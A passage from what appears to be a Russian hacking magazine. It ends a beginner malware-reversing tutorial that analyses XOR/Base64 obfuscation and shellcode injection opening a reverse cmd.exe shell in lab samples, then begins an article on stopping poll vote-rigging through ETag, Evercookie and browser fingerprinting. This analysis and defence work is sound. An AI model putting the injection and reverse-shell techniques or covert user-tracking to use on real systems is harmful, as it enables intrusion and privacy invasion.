«Учимся распознавать полиморфизм и обфуска цию кода на примере извес‐
тного вируса» в одном из прошлых выпусков нашего журнала.
  Для тех же, кому лень разбираться в премудростях обфускаторов и писать
свой запутан ный код, есть готовые программы, которые работают по прин‐
ципу «загрузил — выбрал опции — зашифровал». Найти их можно в кладовке
легендарного VX Heaven. Однако помни, что все эти тулзы давно уже изучены
современными антивирусами и внесены в сигнатурные базы, так что халявы
не будет. :)
  При шифровании кода малвари вирусописатель выбирает конкретный
метод, который наилучшим образом отвечает его целям. Иногда могут
использоваться простые шифры, к примеру логические побитовые опе‐
рации — OR или XOR, реализующие битовые сдвиги в машинных инструкциях,
или же сложные алгоритмы, к примеру Base64, изначально разработанный
для кодирования сообщений электронной почты.
   Часто  используемый  шифр,  базирующийся  на  операции  XOR, —
это самый простой шифр, который весьма похож на всем известный шифр
Цезаря. XOR, или исключающее OR, — логическая, или, как еще называют,
битовая, операция, которая может быть использована для изменения ори‐
гинального порядка битов в ассемблерном коде. Операция XOR для шиф‐
рования использует значение статического байта. Каждый байт тек ста пос‐
ледовательно изменяется. Для тех, кто не понял, хорошим подспорьем будет
вот этот пример, там наглядно показывают, как текст шифрует ся, причем пра‐
вило сдвига букв можно выбрать самому.
  Существует еще несколько простых алгоритмов шифрования, основан ных
на использовании рассмотренных инструкций:
 • Ал горитмы ADD и SUB позволяют производить кодирование операциями
  ADD и SUB для отдельных байтов блока аналогично операции XOR. ADD
   и SUB — нереверсивные операции, поэтому их необходимо использовать
   совместно, то есть одну для шифрования, а другую для расшифровки.
 • ROR‐ и ROL‐инструкции позволяют перевернуть несколько битов в байте
   справа или слева. Точ но так же, как ADD и SUB, они должны использовать‐
   ся вместе, поскольку они необратимы, то есть выполняют ся только в одну
   сторону.
 • ROT — это оригинальный шифр Цезаря. Обыч но использует ся латинский
  алфавит (A–Z и a–z), начиная с любой буквы, или 94 печатных символа
   в стандартной кодировке символов ASCII.
 • Многобайтовые (Multibyte Instead) преобразования заключаются в том, что
   заменяется не один байт, данный алгоритм позволяет использовать боль‐
  ше ключевых значений (к примеру, часто берутся цепоч ки 4 или 8 байт
   длиной). В этом случае ради удобства применя ют операции XOR для каж‐
   дого блока.

Чуть более подробно о приемах обфуска ции, построенных на использовании
простых операций, можно почитать в статье Malware Monday: Obfuscation.


Спе циали зиро ван ный инстру мен тарий
 • IDA Pro имеет очень полезный пла гин под названием FindCrypt2, также
   идущий в пакете для разработчиков IDA Pro SDK. Плагин ищет в теле
   дизассемблированной программы специфические константы, связанные
   с криптогра фическими алгорит мами. И нужно сказать, хорошо справляет ‐
   ся со своей задачей, так как большинство ал горитмов шифрования давно
   известны и изучены и используют сигнатурные элементы, по которым мож‐
   но вычислить алгоритм.
 • Krypto ANALyzer, он же просто KANAL, тоже весьма полезный инструмент,
   который использует те же принципы, что и пла гин FindCrypt2 для IDA Pro.
  Однако Krypto ANALyzer предназначен для PE‐ана лизатора, в нашем слу ‐
   чае это неутомимый PEiD. Помимо констант и алгоритмов шифрования,
   Krypto ANALyzer распознает также таб лицы Base64 и свя занные с шиф‐
   рованием функции из таб лицы импорта.
 • IDA Entropy Plugin — один из инструментов, который поз воляет искать
   признаки энтропии, в нашем случае шифрования в PE‐файлах. Он
   выручит, когда первые два со своей задачей не справились, но у нас есть
   подозрение, что криптография в коде точ но используется. Достаточ но
   просто загрузить данный плагин в IDA Pro, поместив ida‐ent.plw в каталог
   IDA, где лежат все пла гины.


             INFO

                Шифрование кода malware с целью обфускации
                       во многом зависит от ком петенции вирусописа‐
                          теля.  Для шифрования  могут  использоваться
                        в самом простом случае логические побитовые
                      операции, например OR или XOR, реали зующие
                      битовые  сдвиги  в  машинных  инструкциях,
                      или сложные алгоритмы, к при меру Base64, изна‐
                        чально раз работанный для кодирования сооб‐
                    щений электронной поч ты.



ВНЕДРЕНИЕ SHELLCODE, ИЛИ КАК ПОЛУЧИТЬ УДАЛЕННЫЙ
ДОСТУП К КОМАНДНОМУ ШЕЛЛУ
Те оре тическая часть
Шелл‐код (англ. shellcode) — это часть кода, встроенного в малварь и поз‐
воляющего после инфицирования целевой системы жертвы получить код
командной оболочки, например /bin/bash в UNIX‐подобных ОС, command.‐
com в черноэкранной MS‐DOS и cmd.exe в современных операционных сис‐
темах Microsoft Windows. Очень часто шелл‐код используется как полезная
нагрузка эксплоита, но это выходит за рамки нашего материала. Зачем все
это нужно? Как ты понимаешь, мало просто инфицировать систему, проэкс‐
плуатировать уязвимость или положить какую‐нибудь системную службу. Все
эти действия хакеров во многих случаях нацелены на получение админского
доступа к зараженной машине. Так что малварь — это всего лишь способ
попасть на машину и получить shell, то есть управление. А это уже прямой
путь к сливу конфиденциальной информации, созданию ботнет‐сетей, прев‐
ращающих целевую систему в зомби, или просто выполнению иных деструк‐
тивных функций на взломанной машине.
  Шелл‐код обычно внедряется в память эксплу атируемой программы, пос‐
ле чего на него переда ется управление при помощи использования програм‐
мных ошибок, таких как переполнение стека или переполнение буфера в куче,
или использования атак форматной строки. Пока не забыл: хорошая статья
на Хабре на эту тему. Управление шелл‐коду передается перезаписью ад‐
реса возврата в стеке адресом внедренного шелл‐кода, перезаписью адре‐
сов вызываемых функций или изменением обработ чиков прерываний. Кстати,
не припоминаешь ли чего из прошлого урока про инжекты в процессы? :)
Результатом всего этого и будет выпол нение шелл‐кода, который открывает
командную строку для исполь зования взломщиком.
  Для тех, кто готов погружаться в дебри шелл‐кода и пробовать свои силы
в  разработке,  отличная  статья  из  нашего  журнала  «Многоразрядные
шелл‐коды. Пишем Ring0‐shellcode под Windows x64».
  При эксплуатации удаленной уязвимости (то есть эксплоита) шелл‐код
может открывать на уязвимом компьютере заранее заданный порт TCP
для дальнейшего уда ленного доступа к командной обо лочке. Такой код
называется привязы вающим к порту (англ. port binding shellcode). Если же
шелл‐код подключается к порту компьютера ата кующего (с целью обхода
брандмауэра или просачивания через NAT), то такой код называется об -
ратной оболоч кой (reverse shell shellcode).
   Если ты хочешь побаловаться использованием эксплоитов, дорога тебе
к Metasploit Framework, однако это выходит за рам ки нашей статьи, поэтому я
приведу лишь несколько ссы лок на интересные статьи, которые ты можешь
изучить самостоятельно.
 • Введение в Metasploit Framework
 • Инъекция по‐черному. Обходим антивирусы при помощи Shellter
 • Фабрика сплоитов: учимся писать эксплоиты для Metasploit Framework
 • Основы написания Win‐шелл‐кода

Существуют два способа запуска шелл‐кода в память на исполнение:
 • Метод position‐independent code (PIC, позиционно независимый код) —
   это код, который использует жесткую привязку бинарного кода (то есть
   кода, который выполнится в памяти) к определенному адресу или дан ным.
  Шелл‐код — это по сути PIC. Почему жесткая привязка так важна? Шелл
   не может знать, в каком именно месте оперативной памяти будет рас‐
   полагаться, поскольку во время выполнения различных версий скомпро‐
   метирован ной программы или малвари они могут загрузить шелл‐код
   в разные ячейки памяти.
 • Метод Identifying Execution Location («Определяй свое место выполнения»)
   заключается в том, что шелл‐код должен разыменовать базовый указатель
   при доступе к данным в позиционно независимой струк туре памяти.
  Добавление (ADD) или вычитание (Reduce) значений от базового указате ‐
   ля позволяет безопасно получить доступ к данным, которые входят в сос‐
   тав шелл‐кода.


Об наруже ние шелл‑кода на взло ман ной машине
Хакеры, дорожащие своей свободой и репутацией, пишут шелл‐коды, исполь‐
зуя техники, скрывающие их ата ку. Так, типичная система обнаружения втор‐
жений (англ. IDS) обычно просматривает весь входящий сетевой трафик
в поисках структуры, специфичной для шелл‐кода. Если IDS находит такую
структуру, то пакет, содержащий эту сигнатуру, уничтожается до того, как он
еще достигнет своей цели. Однако сла бая позиция IDS состоит в данном слу‐
чае в том, что если тра фик закодирован, то распознать его не удастся.
Теперь ты улавливаешь, почему так ценно шифрование?


           WARNING

                      Будь осторожен при скачива нии и распаковке
                       архивов с образцами malware на компьютер. Все
                       исследования выполняй только в изолированной
                      виртуальной  среде!  Не  выполняй  действий,
                        в которых на 100% не уверен! И не забывай
                        делать регулярные snapshot системы для быстро‐
                         го отката в случае поломки.



АНАЛИЗ СЕМПЛА MALWARE01
Инструменты:
 1. IDA Pro (with plugins).
 2. OllyDbg.
 3. PEiD (with Krypto ANALyzer).

Ну что же, начнем! Первым делом открываем PEiD и грузим туда наш семпл.
Все как и ожидалось, никаких сюрпризов. Однако мы помним, что име ем дело
с криптографией в коде мал вари, поэтому попробуем запустить плагин Krypto
ANALyzer (должен быть предварительно подгружен в PEiD). И вот что мы
видим: сигнатуры обнаружены.





             Результат анализа файла в программе PEiD

Идем дальше. Открываем IDA Pro и загружа ем туда семпл, минуя множество
окон и малоинформативных сведений, обра щаем внимание на таблицу
ресурсов… Да, и здесь тоже нет ничего бросающегося в глаза.





                 Отображение окна String в IDA Pro

Быть может, попытаем счастья в поиске сетевой активности? Хм… Запускаем
Process Explorer, далее выделяем процесс, запущенный нашим вредоносом,
переходим в «Свойства», жмем вкладку Strings и параллельно запускаем
сетевую акулу Wireshark, в окне анализа пакетов можно обнаружить GET‐зап‐
рос на веб‐ресурс http://www.practicalmalwareanalysis.com. Дан ные на вклад‐
ке Strings утилиты Process Explorer и выдернутые из пакета Wireshark совпали.





         Сравнение данных String в Process Explorer и Wireshark

Вернемся к дизассемблеру IDA Pro. На графической диаграмме замечаем
любопытные строки: подпрограмма @0x00401300 загружает некий ресурс
в двоичном виде и применяет операцию XOR для некото рого значения ';'.
На следующем скриншоте это весьма явно заметно.





                       Данные из IDA Pro

Ниже скриншот окна из IDA Pro, где желтым подсвечены инструкции шиф‐
рования с помощью операции XOR.





     Текст кода с инструкциями шифрования с помощью операции XOR

И у нас возникает закономерный вопрос: какой ключ (шифр) используется
для кодирования и что конкрет но он кодирует? Вспоминая то, что мы нашли
рань ше, можно сделать вывод, что ключ ';' призван декодировать стро ку,
содержащую URL http://www.practicalmalwareanalysis.com.
                   ← НАЧАЛО СТАТЬИMALWARE
РЕВЕРСИНГ
МАЛВАРИ
ДЛЯ НАЧИНАЮЩИХ
      ЧАСТЬ 4: ВНЕДРЕНИЕ SHELLCODE
      И ШИФРОВАНИЕ MALWARE‐КОДА



Итак, мы определили, какой алгоритм шифрования используется и какие дан‐
ные он шифрует. Пора подключать плагины, которые помогут нам в декоди‐
ровании. Мы будем использовать инструменты поиска сигнатур FindCrypt2,
Krypto ANALyzer и IDA Entropy Plugin, чтобы определить другие механизмы
кодирования.





        Окно с результатами парсинга семпла в Krypto ANALyzer

KANAL plugin обнаружил четыре адреса, использующих символы из строки
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/.
Как думаешь, на что это похоже? Да‐да, мой друг, ты правильно смекаешь,
что этот набор символов представляет собой алфавит, из которого потом
делаются перестановки. А что же с сетевым тра фиком? Для его кодирования
используется алгоритм Base64. Ниже представлен скриншот из отладчика
OllyDbg, иллюстрирующий закодирован ные строки.





              Закодированные строки Base64 в OllyDbg

А вот скрин шот все из того же отладчика, содержащий инструкцию, которая
отвечает за сам процесс кодирования.
   Где‐то в коде есть функция, отвечающая за декодирование информации
по алгоритму Base64, и находит ся она по адресу 0x004010B1.





  Функция, отвечающая за декодирова ние информации по алгоритму
  Base64

Посмотрим этот код на диаграмме из IDA Pro, жел тым подсвечены ключевые
характеристики кодирования, а именно: максимальная длина сообщения —
12 символов. В описании алгоритма максимальная длина в Base64 составля‐
ет 16 байт.





                     Просмотр кода в IDA Pro

А вот тут мы и подходим к главному вопросу: что же малварь делает после
своего запуска? Код малвари ска нирует имя компьютера, на котором он
запустился, шифрует его и посылает на веб‐ресурс (максимум 12 байт)
http://www.practicalmalwareanalysis.com каждые 30 секунд, пока не получит
строку со значением 0x6F в качестве первого символа в ответе. Так сказать,
мини‐реализация RAT, то есть управляющего сервера, посылающего коман‐
ды, и зараженной машины, получающей и исполняющей эти команды.


АНАЛИЗ СЕМПЛА MALWARE02
Инструменты:
 1. IDA Pro.
 2. OllyDbg.

Наш семпл будет содержать шелл‐код, который позволит после запуска
на заражен ной машине получить удаленное управление по TCP/IP и доступ
к командной оболочке ОС. Ну, поеха ли! Грузим файл в IDA Pro и в строках
кода видим, что некая функция в коде вызывается, чтобы создать новый про‐
цесс, а затем ин жектит (внедряет) в него необходимый для получения удален‐
ного доступа шелл‐код.





       Окно IDA Pro c инструкциями по созданию нового про цесса

Переходим к OllyDbg, чтобы увидеть аргументы, передаваемые в функцию
создания процесса GetProcessID (см. 0x4013DE). Мы можем установить точку
останова на месте этой инструкции. На следующем скриншоте мы видим, что
путь к запуску iexplore.exe переда ется в функцию, а она, в свою очередь,
использует его для реализации CreateProcess, то есть создания про цесса,
в который внедряется шелл‐код.





             Окно OllyDbg c точкой останова на 0x4013DE

Это верное направление, продолжаем копать в эту сторону. Чтобы найти
шелл‐код, я бы сначала попробовал поискать вызов функции, ответственной
за внедрение шелл‐кода в удаленный процесс. Поиск WriteProcessMemory
будет весьма хорошим направлением для этого.





            Окно IDA Pro c функцией WriteProcessMemory

Как видим из скриншота, по адресу 0x00401230 вызывается функция с аргу‐
ментом lpbuﬀer, который передается вместе с такими параметрами, как раз‐
мер буфера и идентификатор процесса (PID). Нет рудно догадаться, что эта
функция отвечает за открытие дескриптора удаленного про цесса и в конеч‐
ном счете позволяет записать в него какие‐то данные. Чтобы разобраться
с этим, мы просто должны проследить, кто вызвал эту функцию, и таким обра‐
зом выяснить, где находится шелл‐код.





             Шелл‐код, расположенный по адресу 0x407030

Идем дальше… Так‐так‐так, вот, кажет ся, мы и нашли шелл‐код по адресу
@0x407030. Смотрим на него (скриншот ниже), а затем нажимаем клавишу C,
чтобы преобразовать данные в байт‐код.





    Содержимое шелл‐кода после преобразования в байт‐код в IDA Pro

Глядя на найден ный шелл‐код на следующем скриншоте из дизассемблера,
мы видим, что автор малвари использует трюк с вызовом, как это было опи‐
сано чуть ранее, чтобы получить адрес шелл‐кода. Анализируя коды, мы
можем предположить, что шелл‐код, начиная с адреса 0x407048, декодирует ‐
ся с помощью операции XOR с 0xE7.





      Шелл‐код исполь зует вызов инструкций и преобразования XOR

Для анализа шелл‐кода мы можем извлечь его из процесса и запустить,
используя sctest.
  Для этого на функции WriteProcessMemory ставим первый брейк‐пойнт.
До того как этот код будет записан в удаленный процесс, мы меняем первый
байт шелл‐кода со значения 0x407030 на другое значение 0xCC (наша точка
останова). Запускаем под отладчиком iexplore.exe, после его запуска сра‐
ботает точка останова, и шелл‐код не будет внедрен в процесс.
  При анализе шелл‐кода мы встретим функции, которые отвечают за руч ‐
ное импортирование некой следующей функции. Ты можешь поставить
брейк‐пойнт на CALL‐инструкции в шелл‐коде, чтобы отслеживать, где (по
какому адресу) в памяти он находит ся.





                   Просмотр импорта в OllyDbg

Теперь мы ставим брейк‐пойнт @ при инициации удаленной связи с парамет ‐
ром SockAddr, который передается шелл‐коду, то есть, грубо говоря, переда‐
ется IP‐адрес машины, которую нужно подцепить. Ниже на скриншоте показа‐
ны преобразования машинных данных в понятные человеку параметры (IP‐
адрес и TCP‐порт).





                   Структура SockAddr в окне OllyDbg





                 Преобразование Hex to IP Address

В итоге мы видим, что reverse shell (cmd.exe) под клю чает ся на инфициро ван‐
ной машине по адресу 192.168.200.2:13330. Шелл‐код создает про цесс
командной оболочки CreateProcessA после подключения к удаленному IP.
  А вот так выглядит терминал Linux, с которого мы атаковали удаленную
машину. В выводе терминала мы видим получение приглашения cmd.exe
на инфицирован ной машине с адресом в сети 192.168.200.2:13330.





  Вывод терминала Linux после эксплуатации малвари на машине жертвы


ЗАКЛЮЧЕНИЕ
Вот и прошли мы вместе с тобой, мой друг, тер нистый путь по дебрям mal‐
ware‐кода. Ты молодец, если дочитал эту статью до конца, и очень крут, если
теперь сможешь повторить все лабораторные работы, не подглядывая. Наш
цикл статей по реверсингу для начинающих на этом заканчивается. Безус‐
ловно, мы рассмотрели только самые базовые и ключевые аспекты анализа
малвари, и осталось очень много тем, о которых стоило бы рассказать. Мож‐
но продолжать эту тему до бесконечности и, наверное, написать даже целую
книгу. Надеюсь, тебе было интересно, ты узнал хотя бы что‐то новое для себя
и теперь представляешь, что такое работа вирусного аналитика. Если есть
вопросы, жалобы или предложения — смело пиши в комменты :).


        WWW

                    Использованные в статье семплы (пароль mal‐
                   ware)


Всем удачи в исследованиях!
КОДИНГ
НА СТРАЖЕ
ЧЕСТНЫХ
ВЫБОРОВ

РАЗБИРАЕМ
СПОСОБЫ
БОРЬБЫ С
НАКРУТКОЙ
ГОЛОСОВАНИЙ





                                                                               Игорь Антонов
                                                                                     Автор журнала «Хакер» с
                                                                                   более чем десятилетним
                                                                                      стажем. Основное место
                                                                                 работы — АО «ДальЖАСО»,
                                                                                               team‐lead. Наставник в
                                                                            HTML Academy
                                                                                            antonov.igor.khv@gmail.com




Создать опрос на сайте — задача пустяковая. На страницах
нашего журнала мы неоднократно разбирали практические
кейсы решений. А вот как убе речь ся от нак рутки? Это уже
совсем другая история, заслужива ющая отдель ного раз ‐
говора. Методов защиты немало, но какие из них наиболее
эффективны? Кстати, даже если ты не интересу ешься воп‐
росами защиты онлайн‐голосо ваний, из этой статьи ты узна‐
ешь, как тебя забанили на анонимном форуме и почему твой
любимый порносайт продолжает учитывать твои вкусы нес‐
мотря на то, что ты чистишь куки или используешь режим
инкогнито браузера :).


ИДЕАЛЬНОЙ ЗАЩИТЫ НЕ БЫВАЕТ?
Спешу огорчить: не пытайся читать статью по диагонали или с конца, надеясь
увидеть наиболее продвинутый и универсальный спо соб защиты. Сереб‐
ряных пуль не существует! Есть ряд мер, помогающих предот вратить нак‐
рутку, но профессионалу не составит труда их обойти.
  Возникает резонный вопрос: а зачем тогда вообще защищаться? Ответ
не менее прост: профессионалов мало и не все они спешат зафейлить твой
опрос. В первую очередь стоит бороться с вредителями сред него уровня —
пользователями, обла дающими неболь шой технической подготовкой. Имен‐
но они будут активно тестировать защиту твоего опроса в надежде нак рутить
пару‐тройку сотен голосов.
  Количество методов борьбы с накрутками ограничивается лишь фантази‐
ей разработчика. Они дают разный процент защиты и наибо лее эффективны
в совместном применении. Для более объективного обзора я отдельно опи‐
сал минусы каждого из представленных решений. Все приведенные способы
защиты не являются магией, поэтому без особого  тру да реализуются
на любом серверном языке программирования. Мне по душе JavaScript
на стороне сервера, поэтому все библиотеки привожу с акцентом на Node.js.
Для PHP, Ruby, ASP.NET есть альтернатив ные решения, которые гуглятся
без особых проблем.


ДЕЛАЕМ СТАВКУ НА КЕШ
Давай немного отвлечемся от программирования и вспомним старый доб рый
протокол HTTP. Не стану выливать на тебя кубометры инфы из спецификации,
а попрошу лишь немного вспомнить теорию кеширования.
  Браузер постоянно кеширует передаваемые по протоко лу HTTP данные,
с целью сэкономить трафик, а заодно и время, необ ходимое на формирова‐
ние страницы. Картинки, сценарии после первой загрузки будут закеширова‐
ны, и при повторном посещении сайта есть все шан сы, что клиенту не при‐
дется заново выкачивать тонну JS‐кода, вагон стилей и картинок.
   Хорошо, о необходимости кеширования вспомнили, но как оно реализует‐
ся? Как браузер понима ет, что закешированный ресурс не изменился
с момента последней загрузки? В этом ему помога ет веб‐сервер. Последний
добав ляет в HTTP-отве ты спе циальные заголов ки, по которым браузер
и ориентируется.
  Протокол HTTP определя ет несколько  заголов ков для кеширования
на клиенте: Last-Modified/If-Modified-Since, Cache-control, Expired и ETag.
Подробней о них ты можешь прочитать в спецификации, а нас сейчас инте‐
ресует лишь ETag.
  Принцип действия заголовка ETag прост как три копейки. Для переда‐
ваемых клиенту ресурсов мы просим сер вер помечать эти данные уникальной
меткой (ETag). Каждая такая мет ка — специальным образом рассчитанная
уникальная контрольная сумма. Попросту говоря — хеш.
  Браузер запомнит соответствие ETag адресу ресурса и при следующем
обращении вставит в запрос заголовок: If‐None‐Match: "хеш". Получив такой
запрос, сервер выполнит проверку, и если ETag для запрашиваемого ресурса
не изменился, то отправит браузеру ответ с кодом 304 (Не изменен).
Для браузера это будет означать, что запрашиваемый ресурс не изменился
и можно доставить его из кеша.
   Это все замечательно, но как оно поможет в нашей проблеме? ETag пре‐
доставля ет допол нительную воз можность отслеживать уникальных посети‐
телей. Достаточно активировать соответствующую опцию для веб‐сервера,
и браузер пользователя будет сам себя выдавать при отправке ETag.
   Установка ETag активируется либо на уров не веб‐сервера (Apache, nginx,
lighttpd), либо самостоятельно при формировании HTTP‐ответа. Повторюсь,
ETag — это просто дополнительный заголовок в HTTP‐ответе. Для Node.js ты
можешь восполь зоваться одноименным модулем. После его под ключения
формирование ETag сведет ся к вызову


res.setHeader("ETag", etag(body));


Минусы
Как таковые отсутствуют, но это не означает, что ETag дает стопроцентную
защиту в определении уникальных пользователей. Обойти его легко: под‐
нимаем локальный проксик и настраиваем на очистку ответов/запросов
от нерадивого заголовка.


Вердикт
Внедрять однозначно стоит. От креативного умника не спасет, но любители
будут удивляться и гадать, как этот трюк работает.


Как реали зовать
Проще всего самостоятельно. Для любителей серверного JavaScript есть
простейший модуль etag (упомянул выше). Фанатам PHP рекомендую пос‐
мотреть докумен тацию по функции http_cache_etag.





           Смотрим ETag через инструменты разработчика


КАПЧИ, HONEYPOT, ТОКЕНЫ, IP
Однажды какой‐то сообразительный малый пред ложил защищать формы
от автоматической отправки предварительным вводом цифр или иных зна‐
чений с картинок. Идея проста, но действенна: распознать символы с кар‐
тинки технически проблематич но и дорого, поэтому хочешь или нет, а придет‐
ся поручить эту работу человеку. Чем изощренней на капче изоб ражены сим‐
волы, тем сложней их обработать в автоматическом режиме. Главное — соб‐
люсти баланс и не усложнять картинки до такой степени, что их станет труд но
прочесть и обычному пользователю.
  Сама по себе капча не изба вит тебя от учета пользователей (регистрация/
привязка к аккаунту соц сети пот ребуется), но надежно прик роет от армии
ботов, жаждущих накрутить статистику. Существует множество реализаций
капч: поиск на GitHub по слову captcha выдаст тебе миллион результатов.
Но лично я бы посоветовал проверенный вариант от Google — reCAPTCHA 2.
Особенность ее в инновационном подходе — пользователю не требуется
вводить символы с картинки  (ага, зато у некоторых юзе ров скоро будут
начинаться припадки при виде фразы «найдите витрины». — Прим. ред.).
  Вместе с капчей неплохо разместить допол нительные капканы для без‐
мозглых роботов. Хорошей практикой давно служит техника honeypot. Смысл
прост — добав ляешь в форму голосования нес колько «скры тых» полей
(то есть полей без визуального отображения) и при обработке формы про ‐
веряешь, запол нено ли такое поле. Поскольку поле скрыто, обычный поль‐
зователь его не запол нит, а бот этого не знает, он попытается перебрать
и запол нить абсолютно все имеющиеся в фор ме поля. Тем самым выдавая
себя.
  Напоследок напомню о применении защит ных токенов для формы.
При создании формы на сервере всегда генерируй для нее токен, который
будет передаваться обратно. Если токен зарегистрирован, то сто ит обра‐
ботать результат, а если нет, то наверняка это бот, отсы лающий фейки.
Наличие токена будет гарантией, что страница была загружена и результаты
голосования отправляются именно с нее.
  Немаловажно также проверять на стороне сер вера IP учас тни ка голосо-
вания. В этом вопросе стоит проявлять особую осто рожность, так как много
пользователей могут фактически сидеть на одном IP‐адресе. Несмотря
на это, никто не отменял фильтрацию отправ ки по времени. Например, если
с одного IP‐адреса многократно отправ ляется форма, то, скорей всего,
здесь что‐то нечисто и такие запросы следует рубить на корню.


Минусы
Внедрение капчи, honeypot, токенов не спасет от пользователя, желающего
проголосовать несколько раз, но хорошо затормозит безмозглых ботов.
Это уже неплохая защита, эффективность которой легко расширяется за счет
внедрения других техник.


Вердикт
Внедрять стоит однозначно! Защита от ботов не может быть лишней, а ведь
именно ими будут пытаться накрутить в первую очередь.


Как реали зовать
Готовых капч существует немало, но наибольшую популярность и славу
надежной заслужила обновленная reCAPTCHA  2, созданная в компании
Google. Для Node.js внедрение заключается в под ключении и настройке
модуля recaptcha2.
   Что касается токенов, то просто гуглим в сторону Cross‐site Request For‐
gery. В проектах для Node.js хорошо себя зарекомендовал модуль csurf.





            reCAPTCHA 2. Инновационная капча от Google


СИЛА ФРОНТА
Вопрос на засыпку: где на клиенте сохранить информацию, позволяющую
точно  сказать,  что пользователь уже проголосовал? Самый попсовый
и ненадежный вариант — cookies. Идея проста: если проверки прошли
успешно, то установим пользователю в cookies сформирован ный на сервере
токен. При следующем посещении страницы обязательно про верим, нет ли
такого токена в базе. Если есть, то пользователь уже проголосовал и нам
неинтересен.
   Звучит хорошо, но пользователю ведь нич то не мешает почистить в бра‐
узере плюш ки и обвести проверку вокруг пальца. Но если способ ненадежен,
зачем про него рассказывать? А затем, что он пригодит ся нам для общей
маскировки.
  Помимо cookies, нам доступны более прод винутые объекты, позволяющие
хранить данные на клиенте: sessionStorage, localStorage и IndexedDB. Нич‐
то не мешает сохранять токены участника голосования в разных местах. Если
у пользователя пустые cookies, а в localStorage, наоборот, имеется дан ный
токен, то поль зователь наверняка совер шил грех накрутки и заслуживает очи‐
щающего бана.





                    Cookies до сих пор используют ся





      Наиболее пол ное собрание доков для фронтенд‐разработчика


Минусы
У пользователя есть полный доступ ко всем перечисленным хранилищам,
и он в любой момент может их очистить. Имеет смысл использовать для соз‐
дания дополнительной линии обороны. Больше помех — выше успех.


Вердикт
Стоит взять на заметку и обязательно реализовать. Далеко не все поль‐
зователи продвинуты. Следовательно, есть шансы, что в одном из хранилищ
информация может задержаться.


Как реали зовать
Взаимодействовать с перечисленны ми хранилищами просто. Для установки
значений используется метод setItem('key', 'value'), а для считывания — get‐
Item('key'). Пара примеров:


sessionStorage.setItem('userId', '12345');
var userId = sessionStorage.getItem('userId'); //123456
localStorage.setItem('userId', '123');
var userId = localStorage.getItem('userId'); //123

С IndexedDB работать чуточ ку сложней (это все же база дан ных), поэтому
за примером отправляю в MDN или сразу к следующему разделу.


СИЛА ФРОНТА. КОПАЕМ ГЛУБЖЕ
Появление новых хранилищ данных на клиенте — замечатель ная новость, но,
кроме  них,  есть  и  другие,  более  непримет ные  места:  хранилище
для Flash/Silverlight-объ ектов, Java JNLP PersistenceService и так далее.
Как ты понимаешь, в них тоже вполне реально оставлять свои метки.
   Чтобы не запутаться и не перегореть в попытках наследить во всех тай‐
никах, был создан проект Evercookie. Биб лиотека позволяет разом записать
необходимые данные в несколь ко источников, а потом так же легко их счи‐
тать.





         Evercookie знает множество тайников и помогает иден‐
        тифицировать пользователя

Если с Evercookie легко разом «осесть» в нескольких не слишком широко
известных местах  операционной  системы,  то библиоте ка  Fingerprint.js
поможет быстро узнать уникальный идентификатор пользовате ля (хеш‐сум‐
ма), рассчитанный по ряду доступных для получения параметров (поддержи‐
ваемые браузером технологии, геозона, список плагинов, User Agent и так
далее). Выходит, вместе с отправкой формы голосования надо еще отправ‐
лять вот такой идентифика тор и уже на сервере определять, был ли голос
от пользователя с таким ID или нет. Поскольку Fingerprint.js для работы
не требуется использование каких‐либо хранилищ, он будет прек расно
работать в режиме инкогнито.


Минусы
Оба проекта чертовски популярны (тот же Fingerprint.js используется в серь‐
езных проектах: MasterCard, AddThis, Baidu и других), а значит, это одновре‐
менно плюс и минус. От простых смер тных они защитят на ура, но люди
в теме смогут их без проблем обойти, так как всегда есть возможность
открыть исходники и разобрать ся с принципом действия.


Вердикт
Проекты аккумулируют множество техник идентификации пользователей,
поэтому однозначно достойны внимания. Легкость интеграции и примене‐
ния — дополнительные аргументы за использование этих биб лиотек.


Как реали зовать
Выполнить две команды для npm и скопипастить несколько банальных стро‐
чек кода из документации.


ДВУХФАКТОРНЫЙ КОНТРОЛЬ
Перечисленные выше способы дают определенный уро вень контроля, но и
его недостаточно. Злоумышленник, жела ющий под крутить результаты, рано
или поздно разберется с защитой и начнет массированную нак рутку. Чтобы
еще больше усложнить жизнь хулига ну, рекомендую добавить в форму
голосований не обходимость под твержде ния голоса через СМС. Банки,
различные сервисы прекрасно используют этот прием во время двухфактор‐
ной авторизации.
  Идея проста: выбрав в форме голосования понравившийся ответ, поль ‐
зователь должен ввести номер мобильного телефона, на который придет
сообщение с проверочным кодом. Дальше он вводит его в спе циальное
поле, и выполняется проверка. Если провероч ный код введен правильно, то
засчитываем голос и запоминаем телефон.
   Второй раз пользователь при всем желании проголосовать с одного
и того же номера не сможет. Чтобы жизнь сов сем малиной не казалась,
заранее можно предусмотреть пул допустимых номеров. Самый простой
вариант — фильтровать по коду страны.
  В особых случаях (например, проведение город ского опроса) целесо ‐
образно отметать номера пользователей из других городов. Да, факапы
в таких фильтрах имеют место быть (появилась возможность переноса
номеров), но никто ведь не говорил, что будет сов сем легко?


Минусы
Голосование должно быть достойно того, чтобы ради него городить такой
огород (для разработчика), и иметь для пользователя достаточную ценность,
чтобы напрягаться с двухфакторной авторизацией. Обрати внимание, что
(спасибо мошенникам) у многих пользователей вооб ще развилась аллергия
на фразу «введите ваш номер телефона» и они закрывают вклад ку браузера
сразу, как только ее увидят.
   Рассылать СМС придется через сто ронний сервис. Чем он надежней, тем
дороже будет исходящее сообщение. Вопрос надежности требует особого
внимания, так как от этого зависит, насколько чет ко и оперативно СМС будут
доходить до адресата.
   Согласись, толку от сообщения с проверочным кодом, полученного через
сутки после голосования, мало. Следовательно, если планируется большое
количество участников голосования, то придет ся разориться.
  Несмотря на общую надежность пред ложенного метода, обойти его впол‐
не реально. Хакер может потратиться на виртуальные номера и автомати‐
зировать получение проверочных кодов. Раздобыть виртуальный номер
с кодом страны (+7) сложней, но все же возможно. Сервисы вроде nexmo
подобные услуги предоставля ют.


Вердикт
Подключать рассылку провероч ных кодов стоит при крайней необ ходимости.


Как реали зовать
Надежных сервисов для отправки сообщений много. Оптимальный вариант —
отправка напрямую через оператора. Большая тройка сотовых операто ров
предоставляет соответствующую услугу (для организаций), и у них реали‐
зован адекватный API и примеры исполь зования. Альтернативным вариантом
могут быть сервисы вроде sms4b.ru. Это по факту посредники, но у них будут
чуть‐чуть более привлекательные цены, и с ними проще начать работать —
организацион ные вопросы решаются однозначно быстрей.


НАМ ПОМОГУТ ПОСРЕДНИКИ
С  накруткой  давно  пробуют  бороться  таким  интересным  способом,
